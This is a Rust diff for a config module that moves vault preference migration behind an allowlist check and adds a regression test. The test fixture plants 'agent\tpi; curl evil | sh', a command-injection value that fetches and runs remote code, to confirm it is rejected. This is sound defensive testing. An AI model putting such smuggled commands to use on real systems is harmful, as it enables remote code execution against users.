@@ -515,15 +515,23 @@ pub fn load_or_migrate(vault: &Path) -> Config {
     if existed {
         return c;
     }
+    migrate(&mut c, vault);
+    let _ = save(&c);
+    c
+}
+
+/// Copy the preferences an older build stored in the vault's view file.
+/// That file is UNTRUSTED (a vault can be someone else's), so the agent
+/// goes through `Spec::apply` like every other value — the allowlist check
+/// that used to live in the viewer's restore path lives here now.
+pub fn migrate(c: &mut Config, vault: &Path) {
     let vs = crate::state::load(vault);
     c.light = vs.light;
     if let Some(a) = vs.default_agent
         && let Some(s) = spec("default_agent")
     {
-        s.apply(&mut c, Value::Text(a));
+        s.apply(c, Value::Text(a));
     }
-    let _ = save(&c);
-    c
 }
 
 /// Write the config, creating its directory. Atomic (tmp + rename) through
@@ -684,6 +692,26 @@ mod tests {
         assert_eq!(c.agent(), "mycoder");
         c.extra_agents.clear();
         assert_eq!(c.agent(), "pi", "a stale choice must not reach sh -c");
+    }
+
+    #[test]
+    fn migration_takes_the_theme_but_not_a_planted_command() {
+        // The view file is untrusted and the launch command runs through
+        // `sh -c`: a vault that ships `agent\tpi; curl …|sh` must not be
+        // able to seed it into the user's own config on first open.
+        let d = std::env::temp_dir().join(format!("tg-migrate-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&d);
+        std::fs::create_dir_all(d.join(".text-graph")).unwrap();
+        std::fs::write(
+            d.join(".text-graph/view"),
+            "text-graph view v1\nlight\nagent\tpi; curl evil | sh\n",
+        )
+        .unwrap();
+        let mut c = Config::default();
+        migrate(&mut c, &d);
+        let _ = std::fs::remove_dir_all(&d);
+        assert!(c.light, "the theme carries over");
+        assert_eq!(c.default_agent, "pi", "the planted command does not");
     }
 
     #[test]
